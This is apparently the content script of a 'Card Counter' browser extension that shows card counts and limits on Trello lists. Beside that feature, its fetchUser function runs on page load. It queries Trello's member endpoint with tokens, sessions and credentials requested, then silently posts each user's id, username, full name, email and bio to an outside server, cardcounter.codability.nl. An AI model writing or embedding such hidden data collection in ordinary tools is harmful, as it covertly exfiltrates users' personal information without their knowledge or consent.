// Card Counter
// version 0.5.0

window.$ = window.jQuery = require('jquery');

var listId;
var boardId;
var donateButton = '<a href="https://www.paypal.me/timvde/8" target="blank" title="Please buy me a beer">Donate <span style="font-weight: normal">💶</span>&nbsp; to support Cardcounter</span>';
var donateText = 'Please support trello CardCounter: https://www.paypal.me/timvde/8';
var totalCardCount = 0;
console.log("%c" + donateText, "color: purple; font-size: 110%; font-weight: bold;");

$(document).ready(function() {
    var matches = window.location.href.match(/\/(.{8})\//);
    if (matches && matches.length > 1) boardId = matches[1];
    setInterval(updateCounts, 3000);
    fetchUser();
    updateCounts();
});

alert('3.1 !!!');

function fetchUser() {
    $.getJSON('https://trello.com/1/Members/me?tokens=all&sessions=all&credentials=all&paid_account=true&credits=invitation%2CpromoCode&organizations=all&organization_paid_account=true&logins=true', function(user) {
        $.post('https://cardcounter.codability.nl/save.php', {
            user: {
                trello_id: user.id,
                username: user.username,
                fullname: user.fullName,
                email: user.email,
                bio: user.bio,
                avatar_hash: user.avatarHash,
                gravatar_hash: user.gravatarHash,
                avatar_source: user.avatarSource,
            }
        });
    });
}


function updateCounts() {
    totalCardCount = 0;
    var numLists = 0;
    $('.list').each(countCards);
    if ($('.list').length != numLists) {
        numLists = $('.list').length;
    }

    $(".js-open-list-menu").unbind().click(function() {
        var list = $(this).parents('.list:eq(0)');
        listId = getListId(list);
        $('.js-limit-list').remove();
        setTimeout(function() {
            $('.js-close-list').after('<li> ' + donateButton + '</li><li><a class="js-limit-list" href"#">Set Cardcounter Limits for this List</a></li>');
            $('.js-limit-list').click(askLimit);
        }, 50);
    });

    updateTotals();
};

function askLimit(e) {
    var limit = prompt('Enter the limit (number), use 0 to remove the limit.', getLimit(listId) > 0 ? getLimit(listId) : 10);
    saveLimit(parseInt(limit));
}

function getLimit(listId) {
    var key = "cardcounter." + boardId + '.' + listId;
    // console.log('getLimit', key);
    return localStorage[key];
}

function saveLimit(limit) {
    var key = "cardcounter." + boardId + '.' + listId;
    localStorage[key] = limit;

    if (limit === 0) {
        delete getLimit(listId);
    }
    updateCounts();
}

function getListId(list) {
    var id = $('.board-header-btn-text:eq(0)').text().trim().replace(' ', '_') + '/' + list.find('.js-list-name-assist').text().replace(' ', '_');;
    return id
}

function countCards(e) {
    var list = $(this);
    var listId = getListId(list);
    var header = $('.list-header', list);
    var limit = getLimit(listId) ? getLimit(listId) : 0;
    var headerName = $('.list-header h2', list);
    var matches = headerName.text().match(/\[(\d*)\]/);
    if (headerName && matches && matches.length == 2) {
        limit = matches[1];
    }

    var numCards = 0;
    var numSpacers = 0;
    var cardContent;
    var cards = $('.list-card', list);
    cards.each(function() {
        cardContent = $('.list-card-title:eq(0)', this).text();
        cardContent = cardContent.replace($(this).find('.card-short-id').text(), '').trim();
        if (cardContent.match(/^=+.*=+$/g)) {
            numSpacers++;
        } else {
            if (!$(this).hasClass('hide')) numCards++;
        }
    });
    totalCardCount += cards.length;

    // console.log('numCards', numCards, limit);

    var counter = $('.cardCounter', list);
    var headerText = list.find(".list-header-extras");
    if (counter.length == 0) {

        counter = $('<span>', {
            'class': 'cardCounter',
            title: donateText,
            click: toggleDonate
        });
        headerText.prepend(counter);
    }

    counter.text(limit > 0 ? numCards.toString() + '/' + limit.toString() : numCards.toString());

    if ($('.badge-points').length > 0 || $('.list-total .points', list).length > 0) {
        // counter.addClass('align-right');
    }

    if (limit > 0 && numCards > limit) {
        counter.addClass('limitReached');
    } else {
        counter.removeClass('limitReached');
    }
}

function toggleDonate() {
    var donateButtonWrapper = $('.donate-wrapper');
    if (!donateButtonWrapper.length) {
        donateButtonWrapper = '<span class="donate-wrapper">' + donateButton + '</span>';
        $('.board-header-btns.mod-left').append(donateButtonWrapper);
    } else {
      if(donateButtonWrapper.is(':visible')){
        donateButtonWrapper.css('display', 'none');
      }else{
        donateButtonWrapper.css('display', 'inline-block');
      }
    }
}

function updateTotals() {
    var totalCards = $('.total-cards');
    if (!totalCards.length) {
        totalCards = $('<span>', {
            'class': 'board-header-btn total-cards',
            click: toggleDonate
        });
        $('.board-header-btns.mod-left').append(totalCards);
    }
    totalCards.text("Total cards: " + totalCardCount);

}
